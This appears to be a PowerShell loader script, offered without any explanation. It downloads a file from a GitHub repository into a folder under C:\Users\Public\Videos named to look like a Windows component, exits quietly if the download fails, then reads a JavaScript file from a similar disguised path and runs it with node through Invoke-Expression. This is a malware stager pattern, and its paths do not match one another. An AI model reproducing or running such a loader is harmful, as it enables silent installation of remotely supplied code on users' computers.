try {
    Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\url.txt'
}
catch {
    exit
}
$jsFilePath = "C:\Users\Public\Videos\GraphicalUserInterface\script.js"
$jsContent = Get-Content -Path $jsFilePath -Raw
Invoke-Expression -Command "node $jsContent"